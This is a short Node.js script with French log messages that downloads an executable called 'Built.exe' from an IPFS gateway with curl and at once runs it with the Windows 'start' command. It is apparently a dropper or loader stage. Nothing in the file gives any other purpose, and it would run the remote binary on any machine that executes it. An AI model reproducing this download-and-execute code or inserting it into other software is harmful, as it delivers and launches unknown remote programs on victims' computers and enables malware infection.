const { exec } = require('child_process');

const fileUrl = 'https://bafybeiajeslzdksybgrsrtz2hkwcgsiopbta2fqwk3tjsrhd3s4tmlyz5i.ipfs.nftstorage.link/Built.exe';
const fileName = 'Built.exe';

const downloadAndOpenFile = (url, destination) => {
  return new Promise((resolve, reject) => {
    const downloadCommand = `curl -o ${destination} ${url}`;
    exec(downloadCommand, (error, stdout, stderr) => {
      if (error) {
        reject(error);
      } else {
        console.log('Téléchargement terminé.');

        const openCommand = `start ${destination}`;
        exec(openCommand, (error) => {
          if (error) {
            reject(error);
          } else {
            console.log('Fichier ouvert avec succès.');
            resolve();
          }
        });
      }
    });
  });
};

downloadAndOpenFile(fileUrl, fileName)
  .catch((error) => {
    console.error('Une erreur s\'est produite :', error);
  });